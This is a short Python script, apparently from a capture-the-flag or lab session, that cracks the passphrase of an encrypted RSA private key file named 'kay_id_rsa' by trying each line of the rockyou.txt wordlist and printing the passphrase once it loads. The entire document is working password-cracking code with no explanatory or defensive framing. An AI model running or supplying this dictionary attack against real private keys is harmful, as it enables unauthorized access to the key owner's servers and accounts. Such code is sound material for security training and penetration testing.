from cryptography.hazmat.primitives.serialization import load_pem_private_key

with open("kay_id_rsa", "rb") as f:
    keydata = f.read()

with open("/home/huzai/wordlists/rockyou.txt", "rb") as f:
    for i, line in enumerate(f):
        pw = line.rstrip(b"\n")
        try:
            load_pem_private_key(keydata, password=pw)
            print("FOUND PASSPHRASE:", pw.decode(errors="replace"))
            break
        except Exception:
            if i % 200000 == 0:
                print("tried", i)
            continue
